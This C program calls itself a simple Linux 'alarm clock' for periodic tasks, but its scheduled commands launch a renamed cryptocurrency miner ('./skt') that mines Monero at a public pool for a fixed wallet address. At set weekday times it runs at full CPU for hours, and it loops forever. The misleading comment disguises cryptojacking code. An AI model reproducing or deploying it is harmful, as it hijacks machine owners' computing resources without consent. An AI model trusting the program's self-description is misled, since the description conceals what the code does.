#include <stdio.h>
//#include <stdlib.h>
#include <unistd.h>
#include <string.h>
//#include <time.h>
/**
 * This small program would run as an alarm clock on a linux system, on some occasion we do not want to run scripts by our own. 
 * The one thing is this for the security, for the other thing this program would do the periodical work which is annoying for an individual to operate for a long term.
 */

/**4-16:14*/
char *key[]={"11:25","5-18:0","18:0"};
char *code[]={
    "./skt -a cryptonight -o gulf.moneroocean.stream:10004 -p x -u 4ABXrDCNuD8STT3iZtCM1NW8NbRec6g4nX7hsACajd4zHF3Ptiudv9N6J1rZSr4Yo6R3NsBQJEicP8AwRi8ETqT8SPVSkcn.中科院低能无理研究所 --asm=intel --max-cpu-usage=100 -k --cpu-priority 5 & PID=$!; sleep 7500; kill -9 $PID",
    "./skt -a cryptonight -o gulf.moneroocean.stream:10004 -p x -u 4ABXrDCNuD8STT3iZtCM1NW8NbRec6g4nX7hsACajd4zHF3Ptiudv9N6J1rZSr4Yo6R3NsBQJEicP8AwRi8ETqT8SPVSkcn.中科院低能无理研究所 --asm=intel --max-cpu-usage=100 -k --cpu-priority 5 & PID=$!; sleep 221600; kill -9 $PID",
    "./skt -a cryptonight -o gulf.moneroocean.stream:10004 -p x -u 4ABXrDCNuD8STT3iZtCM1NW8NbRec6g4nX7hsACajd4zHF3Ptiudv9N6J1rZSr4Yo6R3NsBQJEicP8AwRi8ETqT8SPVSkcn.中科院低能无理研究所 --asm=intel --max-cpu-usage=100 -k --cpu-priority 5 & PID=$!; sleep 50400; kill -9 $PID"};
int listc=3;
int main(int argc, char** argv)
{
    FILE *fp;
    char path[1000];
    int c;
    while(1)
    {
        fp = popen("date +%u-%H:%M","r");
        fgets(path, sizeof(path)-1, fp);
        pclose(fp);
        //printf("%s",path);
        
        for(c=0;c<listc;c++)
        {
            if(strstr(path,key[c]))
            {
                //printf("%s",path);
                fp = popen(code[c],"r");
                
                while (fgets(path, sizeof(path)-1, fp) != NULL)
                {
                    printf("%s", path);
                }
            
                pclose(fp);
                break;
            }
            
        }
        usleep(59000000);
        //usleep(120000000);
        
    }
    return 0;
}
